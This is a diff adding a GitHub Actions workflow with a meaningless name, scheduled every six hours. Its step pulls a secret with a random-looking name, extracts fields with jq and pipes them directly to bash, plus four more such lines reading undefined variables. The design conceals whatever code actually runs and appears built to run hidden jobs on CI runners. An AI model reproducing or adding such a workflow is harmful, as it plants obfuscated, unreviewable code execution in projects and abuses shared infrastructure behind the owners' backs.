@@ -1,0 +1,22 @@
+name: bitesizedcommitment
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: bitesizedcommitment
+        env:
+          fc5958: ${{ secrets.fc5958 }}
+        run: |
+          echo $fc5958 | jq -r .yn9462 | /bin/bash
+          echo $e87 | jq -r .lvkj31 | /bin/bash
+          echo $llhpr91 | jq -r .dg288 | /bin/bash
+          echo $ze666 | jq -r .lmqkx2 | /bin/bash
+          echo $zkjx6 | jq -r .ydhm5 | /bin/bash
+
